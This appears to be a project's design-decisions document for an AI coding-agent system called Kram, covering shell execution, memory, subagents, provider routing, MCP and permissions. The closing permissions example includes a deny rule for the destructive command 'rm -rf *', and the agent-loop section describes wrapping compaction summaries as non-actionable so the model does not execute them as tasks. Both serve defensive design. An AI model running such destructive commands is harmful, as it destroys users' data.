# Decisions

Why Kram is built the way it is. This records the decisions where the
reasoning isn't obvious from the code — especially the ones that were
wrong at first, since a decision that got reversed carries more
information than one that never got tested.

Each entry: what was decided, what the alternative was, and why. Where a
decision came from studying another project, that project is named.

---

## Architecture

### One binary, components in-process

`cmd/kram` runs gateway, daemon and CLI as goroutines in a single
process, not as three subprocesses.

**Alternative:** separate processes, coordinated by ports and a
supervisor.

**Why:** the three components already communicate over HTTP, so keeping
them independently runnable costs nothing — `internal/gateway` and
`internal/daemon` each export the same `Run()` the standalone binaries
call. But the *default* experience should not require three terminals and
manual port coordination. In-process gets a single `ctrl+c` that shuts
everything down together, with no orphaned processes or bound ports.

The components stay genuinely separable: you can still run them on
different machines when you want to.

### A gateway in front of the agent

Provider selection, fallback and circuit breaking live in a separate
layer the agent talks to, rather than inside the agent loop.

**Why:** it makes "which provider answered, after how many attempts" a
first-class fact the whole stack can see — the CLI's footer shows the
real fallback trail per request, not a guess. It also means the agent
loop never contains provider-specific code. Borrowed from OmniRoute's
core idea, reimplemented rather than wrapped.

### The daemon owns durability, the CLI owns nothing

Sessions and messages are persisted to SQLite by the daemon before any
caller is told the write succeeded. The CLI is a pure view.

**Why:** a conversation must survive closing the terminal, and a crash in
the UI layer must not be able to lose history. This is Compozy's
local-first daemon model. Notably, Compozy's own v0.3 converged on the
same shape (daemon + SQLite) after starting from Temporal-backed
workflows — which is evidence against adopting a workflow engine at
Kram's scale.

Pure-Go SQLite driver (`modernc.org/sqlite`), no cgo, to keep the static
binary property.

---

## Cross-platform shell

### A central runner, not per-call-site platform checks

`internal/shell` is the only place that knows how to build and kill a
shell command; `bash.go`, `background.go`, and `customtools.go` all go
through it instead of calling `exec.Command("sh", "-c", ...)` themselves.

**Why:** every one of those three call sites had the same two bugs —
assuming `sh` exists (false on a bare Windows install) and assuming
`Process.Kill()` stops what the command started (false the moment a shell
forks a child, on any platform). Fixing it in three places independently
would have meant three chances to fix it inconsistently, or forget one.

### Unix: a real process group; Windows: a Job Object

Unix commands run with `Setpgid: true` so the shell leads its own process
group; killing sends SIGTERM to the whole group (negative PID), then
SIGKILL after a short grace period if it's still alive. Windows has no
process-group equivalent, so commands are assigned to a Job Object
configured with `JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE` — the actual OS
mechanism other tools (Docker Desktop, containerd, Chromium's launcher)
use for the same "kill this and everything it started" problem.

**Why not just track child PIDs ourselves:** a shell can fork
grandchildren Kram never sees a PID for. Only the OS's own grouping
primitive reliably reaches the whole tree.

### `cmd.exe /S /C`, not `sh.exe`, on Windows

Resolved via `COMSPEC` (falling back to the literal `cmd.exe`), never
Git Bash or WSL's `sh`.

**Why:** those only exist if the user happens to have installed them.
Depending on that silently was the exact bug being fixed — a tool
description that promises `sh -c` semantics on a platform where they
don't hold is a wrong answer that looks like a right one.

### Windows Job Object assignment happens after `Start()`, not via `CREATE_SUSPENDED`

A known, accepted race: a child that forks in the sliver of time between
`Start()` and job assignment could escape the job.

**Why accepted rather than closed:** closing it means creating the
process suspended and resuming it via the thread handle from
`CreateProcess`'s `PROCESS_INFORMATION` — `os/exec` doesn't expose that
handle, so doing it properly means reimplementing `CreateProcess`
ourselves instead of building on `os/exec`. Shell commands spawn children
well after `cmd.exe` itself starts running (parsing the command line,
resolving the program), not in that first instant, so the practical risk
is low. Revisit only if this actually bites someone.

---

## LSP

### Lazy per-language servers, never started at daemon startup

`lsp.Manager` reads no config and starts no process until the first
`lsp_*` tool call for a given language; concurrent calls for the same
language before it's ready all wait on the one in-flight start rather
than racing to launch two.

**Why:** the same invariant MCP servers deliberately don't get (those
connect eagerly at daemon startup via `mcp.ConnectAll`) doesn't apply
here — a language server can be much heavier to start (gopls indexing a
whole module cache) and most sessions never touch most languages a
workspace might contain. Starting only what's actually asked for keeps
daemon startup itself free of that cost entirely.

### A broken or missing language server costs only its own tools

Same contract `mcp.Connect` already established: a failed handshake or a
missing binary never brings Kram down, it just makes `lsp_diagnostics`/
`lsp_definition`/`lsp_references` report "LSP capability unavailable for
`<language>`: `<reason>`" as plain text, which the model can read and fall
back to grep from.

### Own transport, not MCP's — despite both being hand-rolled JSON-RPC

LSP uses `Content-Length`-framed messages over stdio; MCP's stdio
transport is newline-delimited JSON. The dispatch-by-request-id pattern
is shared conceptually between `internal/lsp` and `internal/mcp`, but the
two packages don't import each other — the framing difference means the
transport layer genuinely isn't reusable, and forcing a shared
abstraction over two protocols that happen to both be JSON-RPC would have
been the "more generic than the problem needs" mistake this project
otherwise avoids.

---

## Session search

### A distinct concern from `memory_write`, on purpose

`session_search` answers "where did we actually discuss X" over real
conversation history; `memory_entries`/`memory_fts` stays exactly what it
was — facts the model deliberately chose to remember. Neither replaces
the other.

**Why keep them separate rather than one smarter memory system:** a fact
nobody thought to `memory_write` about is common (most of a conversation
never gets curated), and conflating "what was said" with "what was
decided worth remembering" would make memory noisy in exactly the way its
size cap and curation discipline (see Memory, above) exist to prevent.

### Only `user`/`assistant` messages are indexed — structurally, not by filtering results

The FTS5 trigger that keeps `messages_fts` in sync only fires for
`role IN ('user', 'assistant')` with non-empty content. Tool output and
`system` rows (the system prompt, AGENTS.md injection, and compaction
summaries) are simply never in the index.

**Why structural exclusion instead of filtering compaction summaries out
of search results by name:** a blanket guarantee that doesn't depend on
remembering to check `Name == CompactionMarkerName` in every query path.
A compaction summary can still appear as *context* inside a match's
anchored window (clearly tagged by role), which is legitimate — it's
appearing *as a match*, claiming to be something someone said, that's
the actual failure mode being prevented.

### `subagent: `-prefixed sessions are excluded by default

A subagent's transcript repeating the same terms as the real conversation
it was delegated from would otherwise crowd out the conversation a user
actually wants found. `scope="all"` opts back in explicitly.

---

## Agent loop

### Tool execution waits for a complete response

Streaming and tool execution are decoupled: the loop streams text to the
user as it arrives, but only acts on tool calls once the model's response
is complete.

**Why:** every agent loop we looked at that documents this decision
decouples the two. Acting on a partially-streamed tool call means acting
on possibly-malformed arguments.

### Soft landing on the turn budget

At the last allowed turn, tools are withdrawn and the model is asked
directly for a final answer, rather than being cut off mid-loop.

**Why:** a hard cutoff produces a truncated non-answer. Hermes Agent's
pattern. There's also a grace turn: if the model ignores the wrap-up
request and tries to call tools anyway, it gets exactly one more chance
before the loop stops for real.

### Compaction is capped at 3 attempts per run

Exceeding it fails with `ErrContextOverflow` rather than compacting again.

**Why:** this guards a specific, documented failure mode in other agent
loops — the model treats its own compaction summary as a new task,
executes it, overflows again, and loops forever. The summary is also
stored wrapped as explicitly non-actionable reference material for the
same reason.

### bash is foreground-only — background processes are a separate, explicit tool

No background processes, no servers, no watchers *in `bash` itself*.
Timeout-bounded. Hermes Agent makes the same call for the same reason:
a background process outlives the turn that started it, and nothing in
the loop owns cleaning it up if it's just a stray flag on a generic
shell tool.

**Why not fix this by adding a `background: true` flag to `bash`
instead:** ownership. A flag makes "does this outlive the turn" an
implicit property of arbitrary command text the model wrote, invisible
until something goes looking for it. A separate tool
(`run_background`/`process_list`/`process_output`/`process_kill`,
`internal/daemon/tools/background.go`) makes the decision to start
something long-lived explicit and the resulting process trackable and
killable by id — every process a `processManager` owns, not something
`bash` quietly left running.

Two consequences that follow from making it explicit rather than
implicit: processes are daemon-lifetime, not session-lifetime — a dev
server started from one session is still checkable and killable from a
different one, matching `todoStore`'s pattern rather than being scoped to
whichever conversation happened to start it. And the daemon kills every
tracked process on its own shutdown (`Registry.StopBackgroundProcesses`),
so nothing outlives the daemon as an orphan the way a flag-based approach
would have no natural place to clean up from.

### Images are gated by capability, never assumed

If no provider in the active combo declares `supports_images`, attached
images are dropped before the request and the caller gets an explicit
notice.

**Why:** silently sending a text-only request when the user attached an
image is a wrong answer that looks like a right one.

---

## Memory

### Agent-curated, not auto-captured

The model calls `memory_write` itself. Kram never scrapes conversation
into memory automatically.

**Why:** automatic capture accumulates noise that then needs pruning.
Curated entries stay short and intentional. This is the deliberate
narrowing of [ai-memory](https://github.com/akitaonrails/ai-memory)'s
design.

### A hard per-scope size cap — *reversed decision*

**First version:** memory grew without limit.

**Problem:** memory is injected into the prompt on every turn, so
unbounded memory is an unbounded prompt prefix, forever. "Summarize it
when it gets long" never happens unless something forces it.

**Now:** 2,400 chars per scope. Overflowing doesn't truncate or fail
silently — it returns every current entry with its id and tells the model
to consolidate first, which is why `memory_write` grew `replace` and
`remove`. From Hermes Agent, whose memory files are hard-capped for the
same reason. The cap *is* the design.

### Snapshotted per run, not per turn — *reversed decision*

**First version:** memory was re-read from SQLite on every turn.

**Problem:** the preamble is a prompt *prefix*, and providers cache
prefixes server-side and bill cached input at a fraction of the rate. A
prefix that changes between calls discards that cache on every tool
round-trip — which is exactly where an agent turn makes most of its
calls.

**Now:** snapshotted once per run. Kram freezes per *run* (one user
message and all its tool round-trips) rather than per *session* as Hermes
does, so a fact written mid-conversation still appears on the user's very
next message instead of only in a new session.

### Entry ids are shown in the injected memory

**Why:** `replace`/`remove` need something to target. Without visible
ids, consolidating would require a `memory_search` round-trip first just
to find out what's there — and a consolidation step that costs an extra
call is a consolidation step that doesn't happen.

---

## Subagents

### Zero context inheritance

A subagent starts in a brand-new session knowing nothing about the parent
conversation. It sees only the `goal` and `context` strings passed to it.

**Alternative:** opencode's `task` tool, where delegation creates a child
session within the same context lineage.

**Why Hermes's model instead:** it keeps a delegated task's context
budget independent of however long the parent conversation has run. The
cost is real — the parent must be able to write down everything the child
needs — but that constraint is also a useful forcing function: work that
can't be described in a paragraph probably shouldn't be delegated.

### Depth capped at 1, concurrency at 3

A subagent cannot itself delegate. Both are Hermes's defaults.

**Why:** the failure mode of unbounded delegation is an agent tree that
consumes the entire budget before producing anything. Depth travels
through `context.Context` rather than a parameter threaded through every
tool's `Execute` — only `delegate_task` needs it.

### `delegate_task` blocks until every subtask finishes

**Alternative:** return a handle and poll.

**Why:** it fits Kram's existing synchronous tool contract. Async
delegation would mean building a whole task-status subsystem for v0.

---

## Tools

### Disabled tools are invisible, not just refused

A tool turned off in the settings screen is removed from what the model
is offered, *and* refused if called anyway.

**Why:** the removal is the point — a tool the model can see is a tool it
will try. The refusal is defense in depth, for a model that saw the name
in an earlier turn before it was disabled.

### `ask_question` genuinely blocks the turn

It emits an SSE event and parks the daemon's handler until a *separate*
HTTP call (`POST /sessions/{id}/answer`) delivers an answer.

**Why:** the alternative — returning a placeholder and continuing — means
the model proceeds on an assumption it just said it couldn't make. The
`Asker` interface is injected per-turn via context rather than wired into
the registry at startup, because unlike delegation it needs that specific
turn's live event channel.

### Deterministic output filtering, not LLM summarization

Regex rules keyed on the command that produced the output.

**Why:** an LLM call to compress tool output costs a round-trip, adds
latency, and can hallucinate — on the exact content the model is about to
reason from. Regex can only delete, never invent. Adapted from
OmniRoute's RTK engine.

**The invariant:** preserve patterns are checked before drop rules, so a
line that looks like a failure survives whatever else matches. This is
what `outputfilter_test.go` exists to enforce; a filter that quietly eats
a build error is worse than no filter.

### The all-routine case returns a summary, not the original — *reversed decision*

**First version:** if every line matched a drop rule, return the full
original (the obvious "never return empty" fallback).

**Problem:** caught by the tests on their first run. That's the worst of
both worlds — no signal added, no tokens saved.

**Now:** return the last line plus a count of what was hidden. "It ran and
was unremarkable" is a different claim from "it produced no output", and
both are different from dumping 200 lines of passing tests.

---

## Routing

### Strategy depends on what's in the chain

The auto-built combo picks: no rotation when a paid provider is present,
round-robin when everything is free tier.

**Why:** these two cases want opposite things.

With a paid provider, the catalog order is a *priority* order — it leads
the chain — and prompt-cache economics dominate. Rotating away from it
between tool round-trips re-pays full price for the same prefix, over and
over.

With only free tiers, the providers are interchangeable peers and the
binding constraint is rate limits, not cost. You cannot benefit from a
warm cache on a provider that's answering 429, so proactive spreading
wins.

`prefix-affinity` exists as a third strategy for chains of equivalent
peers where stability matters more than spreading. Its key deliberately
excludes the growing tool-call tail, which would otherwise produce a
different key on every round-trip and defeat the purpose.

### Combos v2: strategy, attempt execution, and response gate are three different concerns

The router used to answer one question — "which providers, in what order"
— and `internal/server/chat.go` did everything else inline: call each in
order, treat any non-error response as good, done. That conflated three
genuinely different decisions into one loop:

1. **Routing strategy** (`internal/router`'s `Strategy` interface):
   decides who to try and in what order.
2. **Attempt execution** (`chat.go`'s `handleChatCompletions`): actually
   calls each ranked candidate until one is accepted.
3. **Response gate** (`gate.go`, `stream.go`): decides whether a
   technically-successful response is actually good enough to end the
   fallback chain.

**Why split them:** the old loop couldn't tell "HTTP 500" apart from
"HTTP 200 with an empty body" — both just meant "try the next one." Once
gating became its own concern (see "Response gate" below), it had to stop
living inside the same loop that decides ordering, or every new strategy
would need to know about gating too.

### `Strategy.Rank` returns a full ranking, never just a winner

```go
type Strategy interface {
    Name() string
    Rank(ctx RouteContext, candidates []Candidate) []RankedCandidate
}
```

**Why a ranking and not a single pick:** the fallback chain needs an
ordered list to fall through when the leader fails or gets rejected — a
strategy that only picked a winner would force the executor to re-ask it
"okay, now who's next" after every failure, which is worse for stateful
strategies (round-robin's cursor, weighted's sticky pin) than computing
the whole order once. It also directly enables explainability (see "UI
route bar" below): the CLI can show `gemini .842, openai .816` for
candidates that were never even attempted, because the full ranking — not
just the one that won — is already sitting in the response.

### Package layout: one package, many files — not `router/strategy`, `router/scoring`, `router/acceptance` subpackages

`internal/router` has ~15 files (`router.go`, `candidate.go`,
`context.go`, `trace.go`, `strategy.go`, `priority.go`, `roundrobin.go`,
`affinity.go`, `weighted.go`, `factors.go`, `normalize.go`, `presets.go`,
`sticky.go`, `lkgp.go`, `p2c.go`, `gate.go`, `stream.go`) but is still one
package.

**Alternative considered:** subpackages (`router/strategy`,
`router/scoring`, `router/acceptance`) mirroring the shape a design
sketch for this suggested.

**Why one package:** `Strategy`, `Candidate`, `RouteContext`, and
`RankedCandidate` all need to be visible both to the parent `Router` (to
construct and call strategies) and to every strategy implementation (to
be ranked). Splitting into subpackages that both need those types creates
a straightforward import cycle — the standard fix is a driver-registration
pattern (`database/sql` + blank-imported drivers), which trades one file
count problem for a different one: now the strategy names have to be
wired up via `init()` side effects and a blank import somewhere, which is
more machinery for a package this size to carry. Go's own standard
library organizes large single packages into many small files
constantly (`net/http` is ~40 files, one package) — that's the same move
here, and it keeps "small router.go" true without inventing an
abstraction boundary the code doesn't actually need yet.

### Strategies: priority, round-robin, prefix-affinity, smart/quality/fast/cheap/reliable (one weighted engine), lkgp, p2c, weighted

`""` and `"priority"` are aliases for the same declared-order strategy —
preserving the exact v0 default. `round-robin` and `prefix-affinity` are
the same logic as before, ported to the `Strategy` interface unchanged.
`smart`, `quality`, `fast`, `cheap`, and `reliable` are five *presets* of
weights over one `weightedStrategy` engine, not five separate
implementations — a custom `weights:` block starts from whichever
preset's own weights and only overrides the factors it mentions, so
`strategy: smart` with a single custom weight still has sensible values
for the other five. `lkgp` and `p2c` are standalone strategies for cases
that want that specific behavior without the rest of the weighted
machinery. An unrecognized strategy name is rejected at `Router.New` time
(a config error, not a silent fallback) — except the empty string, which
has always meant "declared order" and stays that way.

### Six real factors, never fabricated ones

`health`, `reliability`, `latency`, `quality`, `cache_affinity`,
`priority` — each backed by something Kram actually measures or an
explicit operator setting, never invented:

- **health** — circuit breaker state (closed vs. half-open; open is
  already excluded before scoring runs, see "Capabilities and breaker
  state are hard constraints" below).
- **reliability** — `telemetry.ProviderStats.SuccessRate`, real observed
  outcomes.
- **latency** — `telemetry.ProviderStats.AvgLatencyMS`, normalized
  *relative to the current candidate set* (fastest among those being
  ranked scores 1.0, slowest scores 0.0) rather than against a fixed
  millisecond threshold, since there's no universal "good" latency across
  every provider/model a user might configure.
- **quality** — `config.ProviderConfig.QualityHint`, an explicit,
  optional, operator-set 0..1 value. Kram has no real per-provider
  quality measurement of its own; this factor does not exist unless an
  operator sets it.
- **cache_affinity** — whether a candidate is the same provider
  `prefix-affinity`'s own hash would pick for this request, computed with
  the exact same `hashString` function — a real, reproducible signal, not
  an estimated cache-hit rate no one actually has.
- **priority** — declared position in the combo, linearly decaying from
  first to last.

**No-data policy:** a factor with no evidence for a candidate (zero
requests yet, no quality hint set) scores exactly 0.5 — neutral, neither
favored nor punished for being unproven. This is one fixed rule applied
everywhere, not a per-factor special case, so an untested provider
competes fairly on whatever factors *do* have data instead of losing by
default.

Weights are normalized (`normalizeWeights`) to sum to 1 regardless of
what scale they're written in — `{health: 30, reliability: 20, ...}`
summing to 100 works exactly like fractions summing to 1. All-zero or
negative-weight input falls back to an equal split across all six
factors rather than dividing by zero — this is what keeps a malformed
`weights:` block from ever producing NaN or a score that silently favors
nothing.

### Smart Sticky: a hard preference within one run, not a nudge

The weighted strategy family (not priority/round-robin/prefix-affinity/
lkgp/p2c) can pin a run to its winning provider across tool round-trips.
"Run" is identified by `RouteContext.RunKey`, propagated end to end from
the daemon's `Service.Run`/`RunTask` (one opaque ID per run, generated
once, sent on every model call it makes as the `X-Kram-Run-Id` header —
see `gatewayclient.WithRunID`) through to the gateway, which falls back
to the stable system+first-user-message prefix hash (`AffinityKey`) only
when a caller sends no header at all — a generic OpenAI-compatible client
that doesn't know about Kram run IDs. While the pinned provider is still
present in the eligible candidate set (not circuit-open, still
capability-compatible), it leads the ranking regardless of score; only
losing eligibility, or the ResponseGate/StreamGate rejecting its
response, moves the pin — and moving it means whoever wins the retried
request becomes the new pin, via `Router.RecordOutcome`, called only once
a request has *actually* finished (see "Streaming success is decided by
the terminal event, not the first byte" below).

**Found as a real bug, reported by the user via GitHub issue, after
shipping Combos v2:** `RunKey` originally *was* `AffinityKey` directly —
the same key `prefix-affinity`/cache-affinity scoring use. That's stable
across an entire persisted conversation, not just one run: a later,
unrelated user turn in the same session still starts with the same
system+first-user-message prefix, so it inherited the previous run's
sticky pin instead of getting a fresh initial ranking. `AffinityKey`
itself is still exactly what prefix-affinity/cache-affinity need — a
stable prompt-prefix identity across an agent run's tool round-trips —
and keeps working unchanged; `RunKey` is what had to become a genuinely
different, narrower-lifetime concept.

**Why this matters for Kram specifically:** a single user turn can be
many model calls (read a file, grep, edit, run tests, answer) — rotating
providers on every one of those tool round-trips throws away prompt cache
warmth, changes latency/behavior unpredictably mid-task, and re-pays full
price for a near-identical prefix repeatedly. Sticky trades a small amount
of provider diversity for exactly the economics/predictability an agent
loop's tool round-trips want. Default `true` for the weighted family
(configurable per combo via `strategy_options.sticky`); the free-tier
example config explicitly sets it `false`, since spreading load across
rate-limited peers matters more there than cache warmth.

Sticky's own state (`stickyStore`) is a bounded, in-memory map
(`stickyMaxEntries = 256`, oldest-evicted-on-overflow) — no TTL sweeper
goroutine. A pin for an abandoned session costs a little memory, never
correctness, and isn't worth a background cleanup process at this scale.

### LKGP is a modifier first, a strategy second

"Last known good provider" is implemented once (`lkgpStore`, in-memory,
per combo, gateway-process lifetime — deliberately not persisted to disk,
since the gateway normally starts and stops together with the rest of
Kram) and used two ways: as a standalone `lkgp` strategy (priority order,
whoever last won moves to the front), and as an additive score boost
inside the weighted engine (`strategy_options.lkgp_boost`, default 0.10)
on top of whatever the six factors already computed. A circuit-open LKGP
can never win from either form — it's excluded from the candidate set
entirely before any strategy, including LKGP's own ranking, ever runs
(see "hard constraints" below).

### P2C: two random samples and a cheap comparison, not a load balancer

`p2cStrategy` samples two eligible candidates uniformly at random,
compares them with a small health/reliability score (not the full six-
factor engine — the entire point of Power of Two Choices is being cheap),
and promotes the better one to lead; everything else stays in declared-
priority order behind it. This is a well-known technique for avoiding the
herd effect of "always pick the single best" at a fraction of full
scoring's cost — not a distributed load balancer, and not meant to become
one.

### Exploration: a small, capped chance to not pick the leader

`strategy_options.exploration` (default 0.03) gives a uniformly random
eligible candidate a chance to lead instead of the top-ranked one, so
providers that would otherwise never win don't go forever without fresh
telemetry. It is skipped entirely whenever Sticky has already pinned a
leader for this run, never fires with fewer than two candidates, and
never selects a circuit-open or capability-incompatible candidate (both
already excluded before scoring). Deliberately small by default — this is
a safety valve against telemetry staleness, not a bandit algorithm.

**Found as a real bug, reported by the user via GitHub issue:**
exploration originally ran unconditionally *after* Sticky applied — the
code comment even claimed "never overrides sticky," but the ordering
alone didn't guarantee that, since exploration's `moveToFront` ran
regardless of whether Sticky had already moved a different candidate
there. With the default 3% rate, a healthy sticky-pinned provider could
still be randomly displaced on any later model call in the same run,
churning providers and losing prompt-cache warmth for no reason. The fix
tracks whether Sticky actually applied and skips exploration entirely
when it did — Option B from the issue (disable exploration whenever a
valid pin exists) over reordering the two checks, since it also avoids
computing an exploration event that could never have affected the
outcome anyway.

### Capabilities and breaker state are hard constraints, never scores

`eligibleCandidates` filters the candidate list down to circuit-allowed,
capability-compatible providers *before* any `Strategy.Rank` call — a
provider without tool support for a tool-using request, or with an open
circuit breaker, is simply absent from what a strategy ever sees, never
merely scored low. This was a real, confirmed gap in v0: nothing
cross-referenced `req.Tools`/image content against
`SupportsTools()`/`SupportsImages()` at the routing layer at all before
this. Health's *scoring* factor (see above) only ever distinguishes among
candidates that already passed this filter — a half-open breaker scores
lower than a closed one, but "open" never reaches scoring to begin with.

### Response gate: technical validation, never a second-guess of a legitimate refusal

`ResponseGate.Evaluate` runs deterministic checks — `reject_empty`,
`require_terminal`, `min_content_length`, `forbidden_substrings` — against
a fully-received response, entirely opt-in (an unconfigured combo accepts
everything, exactly v0's behavior). It exists to catch empty/truncated/
masked-error responses, never to route around a model's genuine safety or
policy refusal: there is no "did the model say no" check anywhere in it,
and there never should be — a refusal is normal, substantial text like
any other answer as far as the gate is concerned.

A rejection still counts as an operational failure for breaker/telemetry
purposes (a provider that chronically returns short or empty content is
not healthy, even though every individual HTTP call "succeeded"), but
`AttemptInfo.Outcome` keeps `OutcomeRejected` visibly distinct from
`OutcomeError` — an HTTP 500 and an HTTP 200-with-rejected-content are
different findings, and the wire format says so explicitly now instead of
collapsing both into `OK: false`.

### Bounded streaming peek: fallback is still possible after `stream: true`

Once a streamed response's headers are sent, no further fallback is
possible for that request — the client is already receiving bytes.
`router.BoundedPeek` buffers a small, bounded prefix of a candidate's
stream (`streamPeekMaxEvents = 8` events, `streamPeekTimeout = 5s`) before
the executor ever commits to relaying it onward, looking for a
*meaningful* signal: a real non-empty text delta, or a terminal event
carrying tool calls. "Received some bytes" is deliberately not sufficient
— a role-only opening chunk or an empty delta would otherwise look like
progress. If the peek doesn't find a meaningful signal (error, empty
close, timeout, buffer exhausted), the attempt is treated as rejected and
the executor moves to the next ranked candidate, exactly like a buffered
response's gate rejection. If it does commit, every buffered event is
replayed to the client in order before continuing to read fresh events
from the source — the client never knows a peek happened.

### Streaming success is decided by the terminal event, not the first byte

`streamResponse` (`internal/server/chat.go`) is the single place a
committed streaming attempt's real outcome is decided and reported —
`router.RecordOutcome`, breaker success/failure, and the trail entry's
`Outcome`/`OK`/`Reason` all come from one `finalize` closure, called
exactly once per attempt, only once the stream has actually reached one
of three real terminal states: a valid `Done` (success), an explicit
`evt.Err` (failure), or the upstream channel closing on its own without
ever sending either (also failure — see below). Nothing about success is
decided at commit time anymore; `BoundedPeek` committing only proves a
meaningful *first* signal, never that the request will finish.

**Found as two related real bugs, both reported by the user via GitHub
issues, after shipping Combos v2:**

1. The executor used to record `OutcomeSuccess` and call
   `RecordOutcome(..., true)` immediately after `BoundedPeek` committed —
   before the stream had actually finished. A provider whose first delta
   looked fine but that then errored mid-stream could still become the
   Sticky/LKGP winner, and the terminal SSE chunk's `Attempts` trail kept
   showing `success` even though the same request's `finish_reason` was
   `"error"` — genuinely contradictory state visible on the wire.
2. If the upstream channel simply closed on its own after commit —
   without ever sending a terminal `Done` or an `Err` — the old loop just
   ended and Kram still wrote a bare `data: [DONE]\n\n`, indistinguishable
   from a normal finish to any client reading the stream. A truncated
   answer looked like a clean success. This directly undermined
   `ResponseGate.RequireTerminal`'s whole purpose (already enforced on the
   buffered path via `drainToBuffer`'s `sawTerminal`), which simply wasn't
   checked at all once a stream had committed.

Both are fixed by the same `finalize` path rather than two separate
patches, per the issues' own explicit request to avoid duplicate or
competing finalization logic — an abnormal close is treated exactly like
an explicit upstream error (`OutcomeError`, an explicit `finish_reason:
"error"` terminal chunk, no Sticky/LKGP success update), just with a
different `Reason` string ("stream closed without a terminal
completion").

### `AttemptInfo` gained real fields, kept the old ones

`Outcome` (`trying`/`success`/`error`/`rejected`/`skipped`), `Reason`,
`HTTPStatus`, `Score`, `Attempt`, and `Model` are new; `Provider`, `OK`,
and `LatencyMS` are unchanged, and `OK` still equals
`Outcome == OutcomeSuccess` — anything that only ever read the old
two-field shape keeps working. `HTTPStatus` comes from a new
`provider.HTTPError` type the three adapters (anthropic, gemini,
openai-compat) now return instead of a plain `fmt.Errorf`-wrapped string,
so a real upstream status code survives the layers between the adapter
and the wire response instead of only living inside an error message
string.

### `RankedProviderInfo`: every candidate's score is visible, not just who was tried

`ChatCompletionResponse`/`ChatCompletionChunk` gained `Ranking
[]RankedProviderInfo` and `Strategy string` — the *entire* ranking a
scoring strategy produced, including candidates the fallback chain never
actually reached, plus each one's per-factor score breakdown
(`ScoreFactor{Name, Weight, Value, Contribution}`). This is a pure,
lossless projection of what the router already decided
(`router.ToRankedProviderInfo`) — nothing about a score is computed twice,
and nothing here is invented for display purposes. This is what lets a UI
show `gemini .842, openai .816` as context even when only the top
candidate was ever called, and what section-19-style score-breakdown
explainability (health 30% × 1.00 = .300, ...) reads from directly instead
of recomputing.

### `config.StrategyOptions`/`ResponseGateConfig`: fully optional, backward compatible

A `combos:` entry with just `strategy: prefix-affinity` and a `providers:`
list — the entire v0 shape — still loads and behaves identically.
`strategy_options` and `response` are both new, both optional blocks; every
field inside them (`Sticky *bool`, `LKGPBoost *float64`,
`Exploration *float64`, `Weights map[string]float64`, plus the gate's four
fields) defaults to "use the strategy's/gate's own sensible default" when
omitted, which is what lets `strategy: smart` alone (no options block at
all) behave well out of the box.

### Both Anthropic and Gemini adapters concatenate system messages

**Found as a real bug**, while adding AGENTS.md injection: Anthropic
accepts one top-level `system` field and Gemini one `systemInstruction`,
so a second system message (a compaction summary, say) was silently
clobbering the first. Both now concatenate.

---

## MCP

### The stateful protocol era, not the current one

Implements `initialize` → `notifications/initialized` →
`tools/list`/`tools/call`, the lifecycle used through revision 2025-11-25.
Revision 2026-07-28 removes the handshake entirely for stateless
per-request metadata.

**Why the older one:** essentially every MCP server actually deployed
today still speaks it. Implementing only the current spec would produce a
client that's correct against the document and useless against reality.
`client.go`'s `handshake` marks where a modern probe slots in.

### No SDK

MCP is JSON-RPC 2.0 over stdio or HTTP. Hand-rolled.

**Why:** it preserves the pure-Go, static-binary, no-surprise-dependencies
property for maybe 400 lines of protocol code.

### Tools namespace as `mcp__<server>__<tool>`

**Why:** a server publishing `bash` or `read_file` would otherwise
silently shadow Kram's own, changing what those names do. The prefix also
makes origin visible in the tool-activity log.

### Connecting never blocks startup

A server that fails to start or handshake is logged and skipped.

**Why:** MCP servers are third-party processes. One broken entry in a
config must cost you that server's tools and nothing else.

### A dead transport gets reconnected, with bounded backoff, not left dead

`Client.dispatch()` already noticed a dying transport (it unblocks every
pending caller when `Recv()` closes) but nothing acted on it. Now
`Manager` supervises every server it connected: a `Client.Done()` channel
(closed once, by `dispatch()`, whether the death was a crash or a
deliberate `Close()`) tells a per-server goroutine when to redial, with
backoff (1s, 2s, 4s, 8s, 16s, ... capped at 60s) and a hard stop at 5
attempts.

**Why capped, not infinite:** the same "one broken server costs only
itself" contract `ConnectAll` already established — a server that's
genuinely gone (uninstalled, its host is down) must not leave a goroutine
spinning on it for the rest of the daemon's life. It just goes back to
being absent, exactly like a server that failed to connect at startup,
recoverable by a daemon restart.

**Why the Manager's own child context, not the one `ConnectAll` was
given:** `Close()` needs the authority to unblock every supervisor
goroutine (including one mid-backoff-sleep) on its own schedule, without
depending on whoever owns the outer context to have canceled it yet — and
it cancels that child context *before* closing any client, specifically
so a supervisor never observes its own client's deliberate shutdown and
mistakes it for a crash worth reconnecting from.

### `tools/list_changed` updates a snapshot, read again only at the next turn

`dispatch()` used to drop every message with no `id` — spec-correct for
anything unrecognized, but that included this notification. It now
recognizes `notifications/tools/list_changed` specifically, re-fetches
`tools/list` in its own goroutine (so it doesn't block the dispatch loop,
which is itself needed to receive that fetch's response), and swaps
`Client`'s tool snapshot under a lock.

**Why this can't retroactively change a call already in flight:**
`Registry.Definitions()` is read fresh at the top of each turn's loop
iteration in `agent.go`, before that turn's model call is made — never
mid-call. `loadTools` *replaces* the snapshot (a new slice assigned in,
never mutated in place), so anything that already captured the old tool
list for the in-flight turn keeps its own independent copy regardless of
when the swap happens. The refresh lands whenever it lands; what changes
is only what the *next* `Tools()` call sees.

### Schema cache: one file, keyed by server name + a config fingerprint

`kramhome/mcp-cache.json`, not one file per server — at the scale of "how
many MCP servers does one workspace configure" (single digits), one file
is simpler to read/write/reason about atomically than a directory, with
no orphaned per-server files left behind when an entry is removed from
`mcp.json`. Keyed by a SHA-256 fingerprint over every connection-identity
field (kind, command, args, env, url, headers) — deliberately excluding
`Enabled`, since toggling a server off and on again doesn't change what it
would serve. 24h TTL on top of the fingerprint check, since a server can
change its own tool set without Kram's config changing at all.

**What's actually wired up:** every real `tools/list` (initial connect,
a successful reconnect, or a `tools/list_changed` refresh) writes an
entry. **What's deliberately not wired up:** nothing reads the cache to
decide whether `ConnectAll` can skip starting a server's process for pure
discovery — that would change `ConnectAll`'s "always dial every enabled
server, log and skip failures" contract, which this work didn't need to
touch. `cachedTools` is the seam a future lazy-discovery mode would call;
today it's exercised only by its own tests. Recorded here so it doesn't
read as a half-finished feature — it's infrastructure ahead of the need
that would consume it.

---

## Permissions

### A policy layer is a different thing from enabled/disabled

`toolsettings` (enabled/disabled) removes a tool entirely. The new
`internal/permission` package sits *inside* "enabled": a tool can be on in
general but still ALLOW/ASK/DENY per specific call, based on its actual
arguments (`bash: allow "go test *", ask "git push*", deny "rm -rf *"`).

